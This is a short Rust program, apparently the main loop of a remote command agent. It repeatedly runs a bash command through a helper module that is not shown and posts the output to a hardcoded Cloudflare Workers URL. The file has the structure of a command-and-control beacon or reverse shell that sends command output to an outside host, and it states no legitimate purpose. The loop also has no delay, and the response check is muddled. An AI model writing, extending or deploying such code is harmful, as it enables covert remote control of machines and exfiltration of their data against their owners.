mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";
    loop {
        // Execute the command and get the output
        let command_output = match command_executor::execute_bash_command(true) {
            Ok(output) => output,
            Err(e) => {
                println!("Error: {}", e);
                continue;
            }
        };

        // Send the command output to the Worker
        let response = match worker_communication::send_data_request(&worker_url, &command_output).await {
            Ok(response) => response,
            Err(e) => {
                println!("Error: {}", e);
                continue;
            }
        };

        // Check the response from the Worker
        if response == "execute_bash_command" {
            println!("Command output sent to the Worker successfully.");
        } else {
            println!("Unexpected response from the Worker.");
        }
    }
}